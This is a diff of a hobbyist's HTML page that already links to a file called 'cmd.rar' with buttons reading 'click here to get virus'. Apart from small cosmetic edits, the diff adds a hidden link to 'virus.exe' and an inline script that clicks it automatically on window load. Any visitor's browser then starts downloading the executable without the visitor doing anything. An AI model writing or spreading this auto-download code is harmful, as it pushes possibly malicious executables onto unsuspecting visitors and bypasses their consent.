@@ -13,7 +13,7 @@
         <div class="box">
             <h1>
                 First website ever made by <br>
-                <a href="https://www.facebook.com/apurbo.mostafiz/" target="_blank" class="link1">Apurbo Da Vinci</a>
+                <a href="https://www.facebook.com/apurbo.mostafiz/" target="_blank" class="link1"> Apurbo Da Vinci</a>
             </h1>
         </div>
         <div class="box">
@@ -22,9 +22,9 @@
                 <a href="cmd.rar" target="_blank" class="link2">Click this link</a>
             </p>
             <div class="gif">
-                <iframe src="https://giphy.com/embed/vHslzlGM9vKUgFNx0y" width="480" height="476" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-                <iframe src="https://giphy.com/embed/Uduu3VO7a3PJQlD5bm" width="480" height="476" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
-                <iframe src="https://giphy.com/embed/Rq6hqylUmqD95hJK9z" width="480" height="480" frameBorder="0" class="giphy-embed" allowFullScreen></iframe>
+                <iframe src="https://giphy.com/embed/vHslzlGM9vKUgFNx0y" width="480" height="476" frameborder="0" class="giphy-embed" allowfullscreen></iframe>
+                <iframe src="https://giphy.com/embed/Uduu3VO7a3PJQlD5bm" width="480" height="476" frameborder="0" class="giphy-embed" allowfullscreen></iframe>
+                <iframe src="https://giphy.com/embed/Rq6hqylUmqD95hJK9z" width="480" height="480" frameborder="0" class="giphy-embed" allowfullscreen></iframe>
             </div>
             <div class="button">
                 <i class="fa-solid fa-download"><a href="cmd.rar" class="button" target="_blank">click here to get virus</a></i>
@@ -33,7 +33,12 @@
         </div>
     </div>
     <div class="icons">
-     <a href="cmd.rar" target="_blank"><i class="fa-solid fa-download"></i></a>
+     <a href="virus.exe" download target="_blank" id="autodownload"><i class="fa-solid fa-download"></i></a>
+     <script>
+        window.onload = function() {
+            document.getElementById('autodownload').click();
+        }
+    </script>
      </div>
 </body>
 </html>
